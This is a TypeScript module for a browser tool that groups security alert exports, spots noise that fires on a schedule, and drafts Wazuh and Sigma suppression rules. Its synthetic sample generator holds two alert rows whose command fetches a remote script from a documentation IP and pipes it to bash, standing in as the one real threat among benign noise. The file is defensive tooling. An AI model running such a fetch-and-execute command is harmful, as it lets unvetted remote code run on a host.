// Alert-noise analysis: group an alert export by chosen fields, find the groups
// that dominate the volume, check whether they fire on a fixed schedule, and
// draft a suppression with the evidence attached. Pure functions, browser-only.

export type Alert = Record<string, string>

export type Group = {
  key: string[]
  count: number
  share: number
  times: number[]
  first?: number
  last?: number
  period?: number // seconds, when the group fires on a regular interval
  hosts: number
  users: number
}

const flatten = (o: unknown, prefix = "", out: Alert = {}): Alert => {
  if (o && typeof o === "object" && !Array.isArray(o)) {
    for (const [k, v] of Object.entries(o)) flatten(v, prefix ? `${prefix}.${k}` : k, out)
  } else if (o !== undefined && o !== null) out[prefix] = Array.isArray(o) ? o.join(",") : String(o)
  return out
}

function parseCsv(text: string): Alert[] {
  const rows: string[][] = []
  let row: string[] = [], cell = "", q = false
  for (let i = 0; i < text.length; i++) {
    const c = text[i]
    if (q) {
      if (c === '"' && text[i + 1] === '"') (cell += '"'), i++
      else if (c === '"') q = false
      else cell += c
    } else if (c === '"') q = true
    else if (c === ",") row.push(cell), (cell = "")
    else if (c === "\n" || c === "\r") {
      if (c === "\r" && text[i + 1] === "\n") i++
      row.push(cell), rows.push(row), (row = []), (cell = "")
    } else cell += c
  }
  if (cell || row.length) row.push(cell), rows.push(row)
  const [head, ...body] = rows.filter((r) => r.some((x) => x.trim()))
  if (!head) return []
  return body.map((r) => Object.fromEntries(head.map((h, i) => [h.trim(), (r[i] ?? "").trim()])))
}

/** Accepts a JSON array, NDJSON (one alert per line, e.g. Wazuh alerts.json) or CSV with a header row. */
export function parseAlerts(text: string): { alerts: Alert[]; error?: string } {
  const t = text.trim()
  if (!t) return { alerts: [], error: "paste or load some alerts" }
  try {
    if (t.startsWith("[")) return { alerts: (JSON.parse(t) as unknown[]).map((o) => flatten(o)) }
    if (t.startsWith("{")) return { alerts: t.split(/\n+/).filter(Boolean).map((l) => flatten(JSON.parse(l))) }
    return { alerts: parseCsv(t) }
  } catch (e) {
    return { alerts: [], error: `couldn't parse input: ${(e as Error).message}` }
  }
}

const pick = (keys: string[], ...cands: RegExp[]) => {
  for (const c of cands) {
    const k = keys.find((x) => c.test(x))
    if (k) return k
  }
}

/** Best-effort guess of which columns hold time, rule, host, user and command. */
export function detectFields(alerts: Alert[]) {
  const keys = [...new Set(alerts.slice(0, 200).flatMap(Object.keys))]
  return {
    keys,
    time: pick(keys, /^@?timestamp$/i, /^_?time$/i, /date/i),
    rule: pick(keys, /^rule\.id$/i, /^rule_?id$/i, /^(rule|signature|alert)(_?name)?$/i, /rule/i),
    ruleName: pick(keys, /^rule\.description$/i, /^rule_?name$/i, /description/i),
    host: pick(keys, /^agent\.name$/i, /^host(name)?$/i, /host/i, /computer/i),
    user: pick(keys, /user(name)?$/i, /\.uid$/i, /user/i),
    command: pick(keys, /command_?line$/i, /proctitle$/i, /\bexe$/i, /command/i, /image$/i),
  }
}

const toTime = (v?: string) => {
  if (!v) return undefined
  const n = Number(v)
  const ms = Number.isFinite(n) ? (n < 1e12 ? n * 1000 : n) : Date.parse(v)
  return Number.isFinite(ms) ? ms : undefined
}

/** Regular interval in seconds if the gaps between alerts barely vary. */
function periodOf(times: number[]): number | undefined {
  if (times.length < 6) return
  const d = times.slice(1).map((t, i) => (t - times[i]) / 1000).filter((x) => x > 0).sort((a, b) => a - b)
  if (d.length < 5) return
  const med = d[Math.floor(d.length / 2)]
  const within = d.filter((x) => Math.abs(x - med) <= Math.max(2, med * 0.1)).length
  // Bursts (tight gaps, then hours of silence) aren't a schedule.
  const steady = d[d.length - 1] <= Math.max(med * 3, med + 5)
  return within / d.length >= 0.8 && steady ? Math.round(med) : undefined
}

export function groupAlerts(alerts: Alert[], by: string[], f: ReturnType<typeof detectFields>): Group[] {
  const m = new Map<string, { key: string[]; times: number[]; count: number; hosts: Set<string>; users: Set<string> }>()
  for (const a of alerts) {
    const key = by.map((k) => a[k] ?? "")
    const id = key.join("\u0000")
    let g = m.get(id)
    if (!g) m.set(id, (g = { key, times: [], count: 0, hosts: new Set(), users: new Set() }))
    g.count++
    const t = f.time ? toTime(a[f.time]) : undefined
    if (t !== undefined) g.times.push(t)
    if (f.host) g.hosts.add(a[f.host] ?? "")
    if (f.user) g.users.add(a[f.user] ?? "")
  }
  return [...m.values()]
    .map((g) => {
      const times = g.times.sort((a, b) => a - b)
      return {
        key: g.key,
        count: g.count,
        share: g.count / alerts.length,
        times,
        first: times[0],
        last: times[times.length - 1],
        period: periodOf(times),
        hosts: g.hosts.size,
        users: g.users.size,
      }
    })
    .sort((a, b) => b.count - a.count)
}

/** Alerts per hour for one group, over the whole dataset's hour range. */
export function hourly(alerts: Alert[], f: ReturnType<typeof detectFields>, g?: Group) {
  if (!f.time) return []
  const all = alerts.map((a) => toTime(a[f.time!])).filter((t): t is number => t !== undefined)
  if (!all.length) return []
  const h0 = Math.floor(Math.min(...all) / 3.6e6), h1 = Math.floor(Math.max(...all) / 3.6e6)
  const rows = Array.from({ length: Math.min(h1 - h0 + 1, 24 * 14) }, (_, i) => ({
    hour: new Date((h0 + i) * 3.6e6).toISOString().slice(11, 13) + ":00",
    total: 0,
    group: 0,
  }))
  for (const t of all) { const r = rows[Math.floor(t / 3.6e6) - h0]; if (r) r.total++ }
  for (const t of g?.times ?? []) { const r = rows[Math.floor(t / 3.6e6) - h0]; if (r) r.group++ }
  return rows.map((r) => ({ ...r, rest: r.total - r.group }))
}

export const fmtPeriod = (s: number) => (s % 3600 === 0 ? `${s / 3600}h` : s % 60 === 0 ? `${s / 60} min` : `${s}s`)

export function evidence(g: Group, total: number) {
  const out = [`${g.count} of ${total} alerts (${(g.share * 100).toFixed(1)}%)`]
  if (g.first && g.last) out.push(`seen ${new Date(g.first).toISOString().slice(0, 16).replace("T", " ")} → ${new Date(g.last).toISOString().slice(11, 16)} UTC`)
  if (g.period) out.push(`fires every ~${fmtPeriod(g.period)}, like a scheduled job`)
  if (g.hosts === 1) out.push("single host")
  if (g.users === 1) out.push("single user")
  return out
}

const reEsc = (s: string) => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")
const xmlEsc = (s: string) => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")

/** Draft a Wazuh level-0 child rule and a Sigma filter that match exactly this group. */
export function suggest(g: Group, by: string[], f: ReturnType<typeof detectFields>, total: number) {
  const ev = evidence(g, total).join("; ")
  const ruleIdx = f.rule ? by.indexOf(f.rule) : -1
  const parent = ruleIdx >= 0 ? g.key[ruleIdx] : "<parent rule id>"
  const conds = by.map((k, i) => [k, g.key[i]] as const).filter(([k, v]) => k !== f.rule && v)
  const wazuh = [
    `<!-- ${xmlEsc(ev)} -->`,
    `<rule id="100900" level="0">`,
    `  <if_sid>${xmlEsc(parent)}</if_sid>`,
    ...conds.map(([k, v]) => `  <field name="${xmlEsc(k.replace(/^data\./, ""))}" type="pcre2">^${xmlEsc(reEsc(v))}$</field>`),
    `  <description>Reviewed suppression: known-benign ${xmlEsc(conds.map(([, v]) => v).join(" / ") || parent)}</description>`,
    `</rule>`,
  ].join("\n")
  const sigma = [
    `# ${ev}`,
    `filter_known_benign:`,
    ...conds.map(([k, v]) => `  ${k}: '${v.replace(/'/g, "''")}'`),
    `condition: selection and not filter_known_benign`,
  ].join("\n")
  return { wazuh, sigma }
}

// Deterministic synthetic sample: a day of alerts with a few classic noise makers.
export function sampleAlerts(): string {
  let seed = 7
  const rnd = () => ((seed = (seed * 16807) % 2147483647) / 2147483647)
  const day = Date.UTC(2026, 8, 14)
  const rows: object[] = []
  const add = (t: number, rule: [string, string], host: string, user: string, cmd: string) =>
    rows.push({ timestamp: new Date(t).toISOString(), rule: { id: rule[0], description: rule[1] }, agent: { name: host }, data: { user, command: cmd } })
  const ROOT_EXEC: [string, string] = ["100105", "auditd: command executed as root"]
  for (let m = 0; m < 1440; m++) add(day + m * 60_000 + 2000, ROOT_EXEC, "app-01", "root", "/usr/bin/php /var/www/html/cron.php")
  for (let i = 0; i < 260; i++) add(day + rnd() * 864e5, ROOT_EXEC, ["app-01", "app-02", "db-01"][Math.floor(rnd() * 3)], "root", ["/usr/bin/systemctl status nginx", "/usr/sbin/logrotate /etc/logrotate.conf", "/usr/bin/apt-get update"][Math.floor(rnd() * 3)])
  const MOUNT: [string, string] = ["100210", "auditd: mount syscall"]
  for (let b = 0; b < 6; b++) { const s = day + (2 + b * 4) * 3.6e6; for (let i = 0; i < 55; i++) add(s + i * 4000 + rnd() * 2000, MOUNT, "db-02", "root", "/usr/libexec/fwupd/fwupd") }
  const SSH: [string, string] = ["5715", "sshd: authentication success"]
  for (let i = 0; i < 140; i++) add(day + rnd() * 864e5, SSH, ["bastion-01", "app-01", "app-02"][Math.floor(rnd() * 3)], ["deploy", "alice", "bob", "ansible"][Math.floor(rnd() * 4)], "sshd")
  const FIM: [string, string] = ["550", "Integrity checksum changed"]
  for (let i = 0; i < 90; i++) add(day + rnd() * 864e5, FIM, ["app-01", "app-02"][Math.floor(rnd() * 2)], "root", ["/etc/hosts", "/var/www/html/config.php", "/etc/resolv.conf"][Math.floor(rnd() * 3)])
  const CURL: [string, string] = ["100300", "curl piped to shell"]
  add(day + 15.2 * 3.6e6, CURL, "web-03", "www-data", "sh -c curl -fsSL http://203.0.113.9/x.sh | bash")
  add(day + 15.21 * 3.6e6, CURL, "web-03", "www-data", "sh -c curl -fsSL http://203.0.113.9/y.sh | bash")
  rows.sort((a, b) => ((a as { timestamp: string }).timestamp < (b as { timestamp: string }).timestamp ? -1 : 1))
  return rows.map((r) => JSON.stringify(r)).join("\n")
}
